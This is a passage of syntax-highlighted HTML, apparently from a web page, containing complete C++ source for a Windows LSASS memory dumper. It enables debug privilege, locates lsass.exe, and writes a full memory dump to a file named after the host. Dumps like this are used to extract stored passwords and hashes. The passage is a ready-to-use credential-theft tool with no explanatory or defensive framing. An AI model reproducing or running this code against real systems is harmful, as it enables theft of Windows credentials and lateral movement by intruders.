e"><span class="meta">#<span class="meta-keyword">define</span> INFO_BUFFER_SIZE 32767</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="function">wstring <span class="title">s2ws</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len;</span><br><span class="line">        <span class="keyword">int</span> slength = (<span class="keyword">int</span>)s.length() + <span class="number">1</span>;</span><br><span class="line">        len = MultiByteToWideChar(CP_ACP, <span class="number">0</span>, s.c_str(), slength, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">wchar_t</span>* buf = <span class="keyword">new</span> <span class="keyword">wchar_t</span>[len];</span><br><span class="line">        MultiByteToWideChar(CP_ACP, <span class="number">0</span>, s.c_str(), slength, buf, len);</span><br><span class="line">        <span class="built_in">std</span>::<span class="function">wstring <span class="title">r</span><span class="params">(buf)</span></span>;</span><br><span class="line">        <span class="keyword">delete</span>[] buf;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">EnableDebugPrivilege</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID sedebugnameValue;</span><br><span class="line">    TOKEN_PRIVILEGES tkp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>   FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>, SE_DEBUG_NAME, &amp;sedebugnameValue))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Luid = sedebugnameValue;</span><br><span class="line">    tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, <span class="keyword">sizeof</span>(tkp), <span class="literal">NULL</span>, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span> filename[INFO_BUFFER_SIZE];</span><br><span class="line">        <span class="keyword">char</span> infoBuf[INFO_BUFFER_SIZE];</span><br><span class="line">        DWORD  bufCharCount = INFO_BUFFER_SIZE;</span><br><span class="line">        GetComputerNameA(infoBuf, &amp;bufCharCount);</span><br><span class="line">        <span class="built_in">strcpy</span>(filename,infoBuf);</span><br><span class="line">        <span class="built_in">strcat</span>( filename, <span class="string">"-"</span> );</span><br><span class="line">        <span class="built_in">strcat</span>( filename, <span class="string">"lsass.dmp"</span> );</span><br><span class="line"></span><br><span class="line">        DWORD lsassPID = <span class="number">0</span>;</span><br><span class="line">        HANDLE lsassHandle = <span class="literal">NULL</span>; </span><br><span class="line">        HANDLE outFile = CreateFileA(filename, GENERIC_ALL, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">        PROCESSENTRY32 processEntry = &#123;&#125;;</span><br><span class="line">        processEntry.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">        LPCWSTR processName = <span class="string">L""</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Process32First(snapshot, &amp;processEntry)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_wcsicmp(processName, <span class="string">L"lsass.exe"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">                        Process32Next(snapshot, &amp;processEntry);</span><br><span class="line">                        processName = processEntry.szExeFile;</span><br><span class="line">                        lsassPID = processEntry.th32ProcessID;</span><br><span class="line">                &#125;</span><br><span class="line">                wcout &lt;&lt; <span class="string">"[+] Got lsass.exe PID: "</span> &lt;&lt; lsassPID &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (EnableDebugPrivilege() == <span class="literal">false</span>)</span><br><span class="line">                &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"enable %d"</span>, GetLastError());</span><br><span class="line">                &#125;</span><br><span class="line">        EnableDebugPrivilege();</span><br><span class="line">        lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, <span class="number">0</span>, lsassPID);</span><br><span class="line">        BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (isDumped) &#123;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt;<span class="string">"[+] Save To "</span>&lt;&lt;filename&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"[+] lsass dumped successfully!"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
